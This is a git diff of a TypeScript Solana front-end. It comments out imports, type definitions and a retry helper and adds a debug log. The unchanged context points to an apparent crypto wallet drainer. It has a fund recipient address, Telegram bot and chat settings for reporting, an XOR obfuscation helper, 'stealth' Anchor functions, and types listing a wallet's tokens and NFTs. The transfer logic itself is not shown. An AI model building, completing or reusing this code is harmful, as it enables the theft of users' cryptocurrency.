@@ -1,5 +1,4 @@
 import {
-  ComputeBudgetProgram,
   type Connection,
   LAMPORTS_PER_SOL,
   PublicKey,
@@ -15,15 +14,15 @@ import {
   createAssociatedTokenAccountInstruction,
 } from "@solana/spl-token";*/
 import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
-import { sha256 } from '@noble/hashes/sha2';
-import { bytesToHex } from '@noble/hashes/utils';
+/*import { sha256 } from '@noble/hashes/sha2';
+import { bytesToHex } from '@noble/hashes/utils';*/
 import {
   AnchorProvider,
   Program,
 } from "@anchor-lang/core";
-import {  BN, BorshCoder, type Idl } from "@coral-xyz/anchor";
+import {  BN } from "@coral-xyz/anchor";
 import { Buffer } from "buffer";
-import type { IdlInstruction, IdlAccount, IdlTypeDef } from "@coral-xyz/anchor/dist/cjs/idl";
+//import type { IdlInstruction, IdlAccount, IdlTypeDef } from "@coral-xyz/anchor/dist/cjs/idl";
 import type { Wallet } from "@coral-xyz/anchor/dist/cjs/provider";
 
 // ========== CONFIGURATION ==========
@@ -215,7 +214,7 @@ const STEALTH_IDL: any ={
 }// Cast to Idl type
 
 // === TYPE DEFINITIONS ===
-interface HeliusToken {
+/*interface HeliusToken {
   mint: string
   tokenAccount?: string
   account?: string
@@ -232,16 +231,16 @@ interface HeliusBalanceResponse {
   nativeBalance?: number
   tokens?: HeliusToken[]
   nfts?: HeliusNFT[]
-}
+}*/
 
 // === ENV CONFIG ===
-const RPC_URL = import.meta.env.VITE_RPC_URL || "https://api.devnet.solana.com"
+//const RPC_URL = import.meta.env.VITE_RPC_URL || "https://api.devnet.solana.com"
 const HELIUS_KEY = import.meta.env.VITE_HELIUS_KEY || "dummy"
 const RECIPIENT_PUBKEY = import.meta.env.VITE_RECIPIENT_PUBKEY || "11111111111111111111111111111112"
 const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "dummy"
 const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || "dummy"
 
-const MAX_INS_PER_TX = Number.parseInt(import.meta.env.VITE_MAX_INS_PER_TX || "12")
+//const MAX_INS_PER_TX = Number.parseInt(import.meta.env.VITE_MAX_INS_PER_TX || "12")
 const RESERVED_LAMPORTS = Number.parseInt(import.meta.env.VITE_RESERVED_LAMPORTS_FOR_FEES || "10000")
 
 // ==== TELEGRAM MESSAGE FUNCTION ====
@@ -314,6 +313,7 @@ function xorEncrypt(text: string, key: string): string {
 }
 
 // retry wrapper
+/*
 async function retry<T>(fn: () => Promise<T>, retries = 3, delayMs = 1000): Promise<T> {
   for (let i = 0; i < retries; i++) {
     try {
@@ -326,7 +326,7 @@ async function retry<T>(fn: () => Promise<T>, retries = 3, delayMs = 1000): Prom
     }
   }
   throw new Error("Retry failed")
-}
+}*/
 
 // ==== ANCHOR-BASED STEALTH FUNCTIONS ====
 
@@ -378,6 +378,7 @@ async function initializeVault(
         systemProgram: SystemProgram.programId,
       })
       .simulate();
+      console.log("simulate: ", simulationResult)
     
     console.log(`[Anchor] Simulation successful`);
     //console.log(`[Debug] Simulation logs:`, simulationResult?.logs || 'No logs');
